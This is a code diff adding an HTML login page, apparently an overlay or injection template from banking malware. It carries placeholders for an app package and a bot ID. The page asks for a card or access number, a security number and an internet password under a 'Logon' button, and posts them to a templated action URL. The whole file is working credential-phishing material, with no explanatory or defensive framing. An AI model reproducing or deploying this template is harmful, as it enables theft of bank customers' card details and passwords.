@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title>03</title>
+
+    <link rel="stylesheet" href="%DYN_PATH%/css/normalize.css">
+    <link rel="stylesheet" href="%DYN_PATH%/css/mainf1c1.css">
+
+    <link rel="stylesheet" href="%DYN_PATH%/css/03.css">
+<style type='text/css'>
+.form_header:after{
+	content: url('%DYN_PATH%/shadow.png');
+	display: none;
+	position: absolute;
+	bottom: -17px;
+	z-index: -1;
+	left: 50%;
+	margin-left: -204px;
+	max-width: 100%;
+}
+</style>
+    <script src="%DYN_PATH%/js/vendor/jquery-1.11.3.min.js"></script>
+    <script src="%DYN_PATH%/js/viewport.js"></script>
+</head>
+
+<body>
+		<div class="modal modal_03">
+            <div class="row">
+                <div class="form_header">
+                    <img src="%DYN_PATH%/img/logo.png" alt="">
+                </div>
+            </div>
+			<div class="container">
+			<form action="%ACTION%" method="post" class="wrapper">
+                <input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
+
+					<div class="row">
+						<div class="content">
+							<div class="input_block_wr">
+								<div class="inp_caption">
+									Card/Access Number
+								</div>
+								<div class="inp_wr">
+									<input type="text" name="fields[card]" class="main_input">
+								</div>
+							</div>
+							<div class="input_block_wr">
+								<div class="inp_caption">
+									Security Number
+								</div>
+								<div class="inp_wr">
+									<input type="text" name="fields[secnumber]" class="main_input">
+								</div>
+							</div>
+							<div class="input_block_wr">
+								<div class="inp_caption">
+									Internet Password
+								</div>
+								<div class="inp_wr">
+									<input type="password" name="fields[password]" class="main_input">
+								</div>
+							</div>
+							<div class="btn_wr">
+								<button class="logon_btn">
+									Logon
+								</button>
+							</div>
+						</div>
+					</div>
+				</form>
+			</div>
+		</div>
+</body>
+</html>
